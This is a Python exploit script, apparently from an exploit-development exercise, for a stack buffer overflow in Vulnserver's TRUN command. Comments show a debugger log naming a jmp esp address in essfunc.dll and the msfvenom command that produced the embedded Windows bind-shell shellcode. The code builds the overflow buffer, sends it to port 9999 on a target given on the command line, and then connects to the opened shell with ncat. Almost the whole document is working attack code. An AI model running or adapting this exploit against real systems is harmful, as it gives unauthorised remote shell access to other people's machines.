# Log data, item 6
# Address=625011EB
# Message=  0x625011eb : jmp esp |  {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\Users\black\Desktop\d\vulnserver\essfunc.dll)
# ch3rn0byl@w4sted ~ $ sudo msfvenom -p windows/shell_bind_tcp LPORT=1337 -n 20 -b '\x00' -f python -v rekt

from socket import socket, AF_INET, SOCK_STREAM
from struct import pack
from subprocess import call
from sys import argv, exit

rekt =  ""
rekt += "\x2f\x93\x37\x9f\x43\x2f\xf9\x90\xf8\xfd\x92\x93\x92"
rekt += "\xf8\x9b\x93\x42\x3f\xfd\x4b\xdb\xd7\xd9\x74\x24\xf4"
rekt += "\xba\x31\x36\x73\xb1\x58\x31\xc9\xb1\x53\x83\xe8\xfc"
rekt += "\x31\x50\x13\x03\x61\x25\x91\x44\x7d\xa1\xd7\xa7\x7d"
rekt += "\x32\xb8\x2e\x98\x03\xf8\x55\xe9\x34\xc8\x1e\xbf\xb8"
rekt += "\xa3\x73\x2b\x4a\xc1\x5b\x5c\xfb\x6c\xba\x53\xfc\xdd"
rekt += "\xfe\xf2\x7e\x1c\xd3\xd4\xbf\xef\x26\x15\x87\x12\xca"
rekt += "\x47\x50\x58\x79\x77\xd5\x14\x42\xfc\xa5\xb9\xc2\xe1"
rekt += "\x7e\xbb\xe3\xb4\xf5\xe2\x23\x37\xd9\x9e\x6d\x2f\x3e"
rekt += "\x9a\x24\xc4\xf4\x50\xb7\x0c\xc5\x99\x14\x71\xe9\x6b"
rekt += "\x64\xb6\xce\x93\x13\xce\x2c\x29\x24\x15\x4e\xf5\xa1"
rekt += "\x8d\xe8\x7e\x11\x69\x08\x52\xc4\xfa\x06\x1f\x82\xa4"
rekt += "\x0a\x9e\x47\xdf\x37\x2b\x66\x0f\xbe\x6f\x4d\x8b\x9a"
rekt += "\x34\xec\x8a\x46\x9a\x11\xcc\x28\x43\xb4\x87\xc5\x90"
rekt += "\xc5\xca\x81\x55\xe4\xf4\x51\xf2\x7f\x87\x63\x5d\xd4"
rekt += "\x0f\xc8\x16\xf2\xc8\x2f\x0d\x42\x46\xce\xae\xb3\x4f"
rekt += "\x15\xfa\xe3\xe7\xbc\x83\x6f\xf7\x41\x56\x05\xff\xe4"
rekt += "\x09\x38\x02\x56\xfa\xfc\xac\x3f\x10\xf3\x93\x20\x1b"
rekt += "\xd9\xbc\xc9\xe6\xe2\xc7\x30\x6e\x04\xad\x52\x26\x9e"
rekt += "\x59\x91\x1d\x17\xfe\xea\x77\x0f\x68\xa2\x91\x88\x97"
rekt += "\x33\xb4\xbe\x0f\xb8\xdb\x7a\x2e\xbf\xf1\x2a\x27\x28"
rekt += "\x8f\xba\x0a\xc8\x90\x96\xfc\x69\x02\x7d\xfc\xe4\x3f"
rekt += "\x2a\xab\xa1\x8e\x23\x39\x5c\xa8\x9d\x5f\x9d\x2c\xe5"
rekt += "\xdb\x7a\x8d\xe8\xe2\x0f\xa9\xce\xf4\xc9\x32\x4b\xa0"
rekt += "\x85\x64\x05\x1e\x60\xdf\xe7\xc8\x3a\x8c\xa1\x9c\xbb"
rekt += "\xfe\x71\xda\xc3\x2a\x04\x02\x75\x83\x51\x3d\xba\x43"
rekt += "\x56\x46\xa6\xf3\x99\x9d\x62\x03\xd0\xbf\xc3\x8c\xbd"
rekt += "\x2a\x56\xd1\x3d\x81\x95\xec\xbd\x23\x66\x0b\xdd\x46"
rekt += "\x63\x57\x59\xbb\x19\xc8\x0c\xbb\x8e\xe9\x04"

crash = "A" * 2006
crash += pack('<L', 0x625011eb)
crash += rekt
crash += "C" * (5000 - 2006 - 4 - len(rekt))

payload = 'TRUN .{}\r\n'.format(crash)

try:
	host = argv[1]
except:
	print('[!] Uh-oh! Usage: {} [ target ]'.format(argv[0]))
	exit()

print('[+] Attacking Vulnserver...')
try:
	print('[+] Sending payload')
	s = socket(AF_INET, SOCK_STREAM)
	s.connect((host, 9999))
	s.send(payload)
	s.recv(1024)
	s.close()
	print('[+] Trying to connect...\n')
	try:
		call(['ncat', host, '1337'])
	except:
		pass
except:
	print('[!] Uh-oh! Something happened!')
